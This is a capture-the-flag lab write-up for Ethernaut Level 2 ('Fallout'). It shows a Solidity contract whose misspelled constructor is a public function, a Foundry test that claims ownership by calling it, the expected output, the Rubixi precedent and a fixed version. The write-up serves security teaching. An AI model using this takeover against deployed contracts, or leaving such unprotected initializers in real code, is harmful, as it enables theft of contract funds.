# Ethernaut Level 2: Fallout

## Challenge Description
Claim ownership of the contract below to complete this level.

**Difficulty:** ⭐ (Beginner)

**Goal:** Become the owner of the contract.

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Fallout {
    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] += msg.value;
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

## Vulnerability Analysis

```text
Look carefully at the "constructor":

    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

DO YOU SEE THE BUG?

The function is named "Fal1out" (with a number 1 instead of letter l)!
This means it's NOT a constructor - it's a REGULAR PUBLIC FUNCTION!

In Solidity < 0.5.0, constructors were defined by naming the function
the same as the contract. But here, the name is slightly different.

THE BUG: Anyone can call Fal1out() and become the owner!
```

## Exploit Strategy

```text
This is the simplest exploit ever:

Step 1: Call Fal1out() function
   - Since it's a regular public function (not a constructor)
   - Anyone can call it
   - It sets owner = msg.sender (YOU!)

Step 2: Done! You're now the owner.
```

## Exploit Contract (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Ethernaut/Fallout.sol";

contract FalloutExploitTest is Test {
    Fallout public target;
    address public attacker = address(0xBEEF);

    function setUp() public {
        target = new Fallout();
        vm.deal(attacker, 1 ether);
    }

    function test_ExploitFallout() public {
        console.log("Initial owner:", target.owner());

        vm.startPrank(attacker);

        // Simply call the "constructor" function
        // It's actually a regular public function!
        target.Fal1out();

        vm.stopPrank();

        console.log("New owner:", target.owner());
        assertEq(target.owner(), attacker, "Failed to become owner");

        console.log("\n✅ EXPLOIT SUCCESSFUL!");
    }
}
```

## Running the Exploit

```bash
forge test --match-test test_ExploitFallout -vvv

# Expected output:
# [PASS] test_ExploitFallout() (gas: 50000)
# Logs:
#   Initial owner: 0x5B3...
#   New owner: 0xBEEF...
#
#   ✅ EXPLOIT SUCCESSFUL!
```

## Real-World Impact

```text
This exact bug happened in production!

In 2017, a contract called "Rubixi" had this same vulnerability.
The developers named the constructor "DynamicPyramid" instead of "Rubixi".
Anyone could call DynamicPyramid() and steal ownership.

Result: The contract was exploited, and the attackers became the owner
and drained all funds.

Lesson: ALWAYS use the "constructor" keyword in Solidity >= 0.4.22!
```

## How to Fix This Vulnerability

```solidity
// FIXED VERSION - Use the constructor keyword!
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract FalloutFixed {
    mapping(address => uint256) allocations;
    address payable public owner;

    // CORRECT: Use the constructor keyword
    constructor() payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    // ... rest of the contract
}
```

## Key Takeaways
- **Constructor Naming:** In old Solidity (< 0.5.0), constructors were named after the contract. A typo meant it became a regular function.
- **Always Use "constructor" Keyword:** Since Solidity 0.4.22, use the explicit `constructor` keyword to avoid this bug.
- **Typos Can Be Catastrophic:** A single character difference (l vs 1) can turn a constructor into a public function.
- **Compiler Warnings:** Modern compilers warn about this, but always double-check.
- **Lesson Learned:** Never assume a function is a constructor just because it looks like one. Check the Solidity version and syntax.
- **Historical Context:** This is one of the oldest and most famous Solidity bugs.